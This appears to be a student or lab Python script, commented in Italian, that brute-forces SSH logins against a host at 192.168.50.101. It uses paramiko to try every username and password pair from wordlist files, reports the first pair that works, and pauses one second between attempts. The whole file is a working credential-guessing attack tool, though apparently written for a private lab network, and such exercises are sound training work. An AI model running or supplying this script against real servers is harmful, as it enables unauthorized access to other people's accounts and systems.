import paramiko
import time

def loadfile(path):
    
    res = []
    
    try:
      with open(path, "r", errors = "ignore") as f:
        for line in f:
        	res.append(line.strip())
        return res
    except FileNotFoundError :
    	print("File not Found")
    	return []	
    	
    	
if __name__=="__main__":
    
    #costante#
    SERVERURL = "192.168.50.101"
    USERNAME_PATH = "/home/kali/bruteforce/username.txt"
    PASSWORD_PATH = "/home/kali/bruteforce/password.txt"
    
    #Richiamo la funzione loadfile e carico nelle variabili i valori nei file#
    usernames=loadfile(USERNAME_PATH)
    passwords=loadfile(PASSWORD_PATH)

    print(usernames,passwords)
    
    for username in usernames:
    	for password in passwords:
    		try:
    			#creazione client paramiko#
		    	client = paramiko.SSHClient()
		    	#Aggiungo al client la policy per gestire gli host sconosciuti#
		    	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    			client.connect(SERVERURL , username=username , password=password)
    			print("successo > ", username , password , "corretti")
    			#trovati, fine programma
    			exit(0);
    		except  paramiko.ssh_exception.AuthenticationException:
    			print("username:",username," errato")
    			print("password:",password,"errato")
    			
    		except paramiko.SSHException as e:
    			print("SSHException", e)
    		finally : 
    			client.close()
    		# delay random che fa a fine di ogni esecuzione della coppia username, password 
    		#Questa riga mette in pausa l'esecuzione del programma per un intervallo di tempo 
    		time.sleep(1)
